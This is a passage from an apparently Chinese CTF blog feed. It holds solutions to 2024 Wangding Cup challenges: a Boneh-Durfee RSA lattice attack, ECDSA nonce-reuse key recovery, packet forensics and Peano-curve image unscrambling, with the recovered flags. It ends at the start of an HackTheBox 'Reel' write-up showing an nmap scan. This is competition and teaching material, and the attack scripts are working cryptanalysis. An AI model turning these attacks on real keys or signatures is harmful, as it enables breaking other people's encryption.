class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 y 移位列表</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 构造格 B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#约化格的原型</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #自动删除</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 重置维度</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查向量是否有帮助</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查行列式是否正确界定</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 替换向量 i 和 j -&gt;多项式 1 和 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;在格中寻找线性无关向量&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 对于i and j, 构造两个多项式</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 结果</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># 随机生成数据</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        N = <span class="number">69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721</span></span><br><span class="line">        e = <span class="number">28439197921283357831697812537770489393495780585893113255835906777860388696994349687910509232020125501124985537099309478678733953591875352794038209770419925216539701941346792691704315717440469781000758533118851176304883130375842134875219545766782891367082825940026559693057872966937790726617783138946733512771</span></span><br><span class="line">        c = <span class="number">22634701644450101524194718626550730546669791908217195025458791096208664618277869132516992188391372685210476489439282043033169958992171845152117468239445520601245104073454741171223045094363461153069787573765111331214431209598625611554915848071794889073522221012875111880946316417640573688399584093700714982302</span></span><br><span class="line">        hint1 = <span class="number">654543761191063613807</span>  <span class="comment"># p高位</span></span><br><span class="line">        hint2 = <span class="number">819778612327847774041</span>  <span class="comment"># q高位</span></span><br><span class="line"><span class="comment">#         print (&quot;p真实高&quot;,s,&quot;比特：&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;q真实高&quot;,s,&quot;比特：&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 解密指数d的指数( 最大0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># 格大小（越大越好/越慢）</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># 来自 Herrmann 和 May 的优化</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># 如果 p、 q 大小相同，则正确</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#构建的方程</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== 核对数据 ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # e的bit数</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">##print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;p的高比特为：&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;q的高比特为：&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180807684-1768989984.png" alt="image-20241030180802109"></p><p>跑第二个脚本，得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180811902-786743954.png" alt="image-20241030180806277"></p><p>wdflag{31998a91-fd51-4df2-864e-73c122786868}</p><h2 id="CRYPTO02-2">CRYPTO02</h2><p>下载附件，打开代码，问豆包</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180817943-2031923977.png" alt="image-20241030180812378"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先，根据椭圆曲线签名的性质，利用给定的r1, s1, z1, r2, s2, z2恢复dA</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的参数</span></span><br><span class="line">r1 = <span class="number">66378485426889535028763915423685212583706810153195012097516816885575964878246</span></span><br><span class="line">r2 = <span class="number">66378485426889535028763915423685212583706810153195012097516816885575964878246</span></span><br><span class="line">s1 = <span class="number">73636354334739290806716081380360143742414582638332132893041295586890856253300</span></span><br><span class="line">s2 = <span class="number">64320109990895398581134015047131652648423777800538748939578192006599226954034</span></span><br><span class="line">z1 = <span class="number">35311306706233977395060423051262119784421232920823462737043282589337379493964</span></span><br><span class="line">z2 = <span class="number">101807556569342254666094290602497540565936025601030395061064067677254735341454</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据椭圆曲线签名的恢复公式</span></span><br><span class="line"><span class="comment"># s1 * k - z1 = r1 * dA (mod n)</span></span><br><span class="line"><span class="comment"># s2 * k - z2 = r2 * dA (mod n)</span></span><br><span class="line"><span class="comment"># 由于r1 = r2，可以通过联立方程求解dA</span></span><br><span class="line">k = gmpy2.invert(s1 - s2, n) * (z1 - z2) % n</span><br><span class="line">dA = gmpy2.invert(r1, n) * (s1 * k - z1) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用恢复的dA生成AES密钥</span></span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的加密后的flag十六进制字符串</span></span><br><span class="line">encrypted_flag_hex = <span class="string">&#x27;3cdbe372c9bc279e816336ad69b8247f4ec05647a7e97285dd64136875004b638b77191fe9bef702cb873ee93dbe376c050d0c721b69f17f539cff83372cc37b&#x27;</span></span><br><span class="line">encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取IV和密文</span></span><br><span class="line">iv = encrypted_flag_bytes[:AES.block_size]</span><br><span class="line">ciphertext = encrypted_flag_bytes[AES.block_size:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建AES解密对象</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"><span class="comment"># 去除填充</span></span><br><span class="line">plaintext = unpad(decrypted_data, AES.block_size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对替换加密的逆过程（victory_encrypt的逆）</span></span><br><span class="line">victory_key = <span class="string">&quot;WANGDINGCUP&quot;</span></span><br><span class="line">key_length = <span class="built_in">len</span>(victory_key)</span><br><span class="line">decrypted_text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext.decode().upper()):</span><br><span class="line">    <span class="keyword">if</span> char.isalpha():</span><br><span class="line">        shift = <span class="built_in">ord</span>(victory_key[i % key_length]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift + <span class="number">26</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        decrypted_text += decrypted_char</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decrypted_text += char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure><p>运行后成功获取到flag，要转小写</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180832848-1086515924.png" alt="image-20241030180826831"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180840444-116028875.png" alt="image-20241030180834674"></p><h1>MISC</h1><h2 id="MISC01">MISC01</h2><p>下载附件看题目描述</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180845157-545941591.png" alt="image-20241030180839581"></p><p>拿wireshark看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180857245-111451848.png" alt="image-20241030180851376"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180902131-690201118.png" alt="image-20241030180856447"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180906714-779293795.png" alt="image-20241030180900987"></p><p><strong>md5加密</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180910546-2006475635.png" alt="image-20241030180905063"></p><p>最后得到flag</p><p>wdflag{bd9bfee6c7303048dab68cfa6a14b5e7}</p><h2 id="MISC03">MISC03</h2><p>找攻击IP</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180915751-1519011757.png" alt="image-20241030180909859"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180923878-1406315282.png" alt="image-20241030180917812"></p><p>攻击IP为：39.168.5.60</p><h2 id="MISC04">MISC04</h2><p>给了一个这个抽象图片，蓝底红线，凭直觉一个是需要还原成二维码的形式</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180936378-958370206.png" alt="image-20241030180930356"></p><p>根据题干，他是有一个图像加密算法，需要把这个红线还原重组成二维码，搜索一个是这个Peano曲线</p><p>最终找到了一个irisctf的一道赛题The Peano Scramble</p><p><a href="https://almostgph.github.io/2024/01/08/IrisCTF2024/">https://almostgph.github.io/2024/01/08/IrisCTF2024/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peano</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        in_lst = peano(n - <span class="number">1</span>)</span><br><span class="line">        lst = in_lst.copy()</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">order = peano(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&quot;./1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line">block_width = width <span class="comment"># // 3</span></span><br><span class="line">block_height = height <span class="comment"># // 3</span></span><br><span class="line"></span><br><span class="line">new_image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, (x, y) <span class="keyword">in</span> tqdm(<span class="built_in">enumerate</span>(order)):</span><br><span class="line">    <span class="comment"># 根据列表顺序获取新的坐标</span></span><br><span class="line">    new_x, new_y = i % width, i // width</span><br><span class="line">    <span class="comment"># 获取原图像素</span></span><br><span class="line">    pixel = img.getpixel((x, height - <span class="number">1</span> - y))</span><br><span class="line">    <span class="comment"># 在新图像中放置像素</span></span><br><span class="line">    new_image.putpixel((new_x, new_y), pixel)</span><br><span class="line"></span><br><span class="line">new_image.save(<span class="string">&quot;rearranged_image.jpg&quot;</span>) </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180947540-1228530137.png" alt="image-20241030180941362"></p><p>扫码即可</p>]]></content>
    
    
    <summary type="html">网鼎杯 青龙组 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://ya1orin.github.io/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://ya1orin.github.io/tags/CTF/"/>
    
    <category term="Competition" scheme="https://ya1orin.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Reel</title>
    <link href="https://ya1orin.github.io/posts/4097f734.html"/>
    <id>https://ya1orin.github.io/posts/4097f734.html</id>
    <published>2024-10-27T05:34:07.000Z</published>
    <updated>2024-11-13T05:19:54.783Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.77</p></blockquote><h1>知识点</h1><ul><li>RTF钓鱼</li><li>ACL滥用-user-WriteOwner权限</li><li>ACL滥用-group-WriteDacl权限</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.10.77</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 